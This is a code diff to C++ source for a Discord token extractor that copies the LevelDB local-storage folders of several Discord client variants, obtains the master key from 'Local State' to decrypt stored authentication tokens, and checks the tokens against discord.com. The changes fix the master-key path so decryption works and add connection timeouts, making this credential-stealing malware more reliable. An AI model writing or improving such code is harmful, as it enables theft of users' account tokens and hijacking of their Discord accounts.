@@ -303,22 +303,13 @@ std::string TokenExtractor::DecryptToken(const std::vector<uint8_t>& master_key,
 // Scan leveldb directory
 // ---------------------------------------------------------------------------
 
-std::vector<std::string> TokenExtractor::ScanLeveldb(const std::string& dir) {
+std::vector<std::string> TokenExtractor::ScanLeveldb(const std::string& dir,
+                                                       const std::string& discord_path) {
     std::vector<std::string> tokens;
 
-    // Find the Discord install directory (parent of leveldb)
-    // leveldb_path is like: %APPDATA%\discord\Local Storage\leveldb
-    // discord_path is:      %APPDATA%\discord
-    std::string discord_path = dir;
-    // Walk up 2 directories: leveldb -> "Local Storage" -> discord
-    for (int i = 0; i < 2; ++i) {
-        auto pos = discord_path.find_last_of("\\/");
-        if (pos != std::string::npos) {
-            discord_path = discord_path.substr(0, pos);
-        }
-    }
-
-    // Try to get the master key for encrypted tokens
+    // Try to get the master key for encrypted tokens.
+    // discord_path is passed in from Extract() so we don't misderive it
+    // from the temp directory.
     std::vector<uint8_t> master_key;
     bool has_master_key = GetMasterKey(discord_path, master_key);
 
@@ -360,6 +351,10 @@ bool TokenExtractor::ValidateToken(const std::string& token, std::string& out_us
                                           INTERNET_OPEN_TYPE_DIRECT,
                                           nullptr, nullptr, 0);
     if (!hInternet) return false;
+    DWORD ms = 10000;
+    InternetSetOptionA(hInternet, INTERNET_OPTION_CONNECT_TIMEOUT, &ms, sizeof(ms));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_SEND_TIMEOUT,    &ms, sizeof(ms));
+    InternetSetOptionA(hInternet, INTERNET_OPTION_RECEIVE_TIMEOUT, &ms, sizeof(ms));
 
     HINTERNET hConnect = InternetConnectA(hInternet, "discord.com",
                                             INTERNET_DEFAULT_HTTPS_PORT,
@@ -440,7 +435,8 @@ std::vector<ExtractedToken> TokenExtractor::Extract() {
     const char* variants[] = {"discord", "discordcanary", "discordptb", "discorddevelopment"};
 
     for (const char* variant : variants) {
-        std::string leveldb_path = appdata + "\\" + variant + "\\Local Storage\\leveldb";
+        std::string discord_path = appdata + "\\" + variant;
+        std::string leveldb_path = discord_path + "\\Local Storage\\leveldb";
 
         if (!fs::exists(leveldb_path)) continue;
 
@@ -448,8 +444,9 @@ std::vector<ExtractedToken> TokenExtractor::Extract() {
         std::string temp_path;
         if (!CopyLeveldbToTemp(leveldb_path, temp_path)) continue;
 
-        // Scan the temp copies
-        auto tokens = ScanLeveldb(temp_path);
+        // Scan the temp copies, passing the real discord_path so GetMasterKey
+        // can find "Local State" in the correct directory.
+        auto tokens = ScanLeveldb(temp_path, discord_path);
 
         // Cleanup temp directory
         std::error_code ec;
